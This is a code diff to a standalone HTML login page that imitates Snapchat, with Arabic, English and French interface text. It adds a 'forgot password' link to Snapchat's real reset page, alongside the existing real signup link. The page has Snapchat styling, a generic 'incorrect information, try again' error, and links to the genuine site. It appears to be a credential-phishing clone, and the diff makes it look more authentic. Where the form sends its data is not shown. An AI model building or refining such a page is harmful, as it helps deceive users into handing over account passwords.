@@ -71,14 +71,15 @@
             background-color: #fef200;
         }
 
-        .signup-link {
-            margin-top: 20px;
+        .link {
+            margin-top: 10px;
             font-size: 14px;
             color: #007bff;
             text-decoration: none;
+            display: block;
         }
 
-        .signup-link:hover {
+        .link:hover {
             text-decoration: underline;
         }
 
@@ -103,9 +104,17 @@
 
             <button id="submit-button" type="submit">تسجيل الدخول</button>
         </form>
-        <a class="signup-link" href="https://accounts.snapchat.com/v2/signup">
+
+        <!-- رابط التسجيل -->
+        <a class="link" href="https://accounts.snapchat.com/v2/signup">
             Vous débutez sur Snapchat ? Sʼinscrire
         </a>
+
+        <!-- رابط تغيير كلمة المرور -->
+        <a class="link" href="https://accounts.snapchat.com/accounts/password_reset_request">
+            Mot de passe oublié ? Réinitialiser
+        </a>
+
         <div class="message" id="error-message">المعلومات غير صحيحة، جرب مرة أخرى.</div>
     </div>
 
@@ -122,6 +131,7 @@
                 submitButton: "تسجيل الدخول",
                 errorMessage: "المعلومات غير صحيحة، جرب مرة أخرى.",
                 signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
+                forgotPasswordText: "هل نسيت كلمة المرور؟ إعادة تعيين",
             },
             en: {
                 title: "Login",
@@ -130,6 +140,7 @@
                 submitButton: "Log in",
                 errorMessage: "Incorrect information, please try again.",
                 signupText: "New to Snapchat? Sign up",
+                forgotPasswordText: "Forgot your password? Reset",
             },
             fr: {
                 title: "Connexion",
@@ -138,6 +149,7 @@
                 submitButton: "Se connecter",
                 errorMessage: "Informations incorrectes, veuillez réessayer.",
                 signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
+                forgotPasswordText: "Mot de passe oublié ? Réinitialiser",
             },
         };
 
@@ -158,7 +170,12 @@
             document.getElementById('password-label').textContent = texts.passwordLabel;
             document.getElementById('submit-button').textContent = texts.submitButton;
             document.getElementById('error-message').textContent = texts.errorMessage;
-            document.querySelector('.signup-link').textContent = texts.signupText;
+
+            const signupLink = document.querySelector('.link[href="https://accounts.snapchat.com/v2/signup"]');
+            const forgotPasswordLink = document.querySelector('.link[href="https://accounts.snapchat.com/accounts/password_reset_request"]');
+
+            signupLink.textContent = texts.signupText;
+            forgotPasswordLink.textContent = texts.forgotPasswordText;
         }
 
         applyTranslations(); // تطبيق الترجمة عند تحميل الصفحة
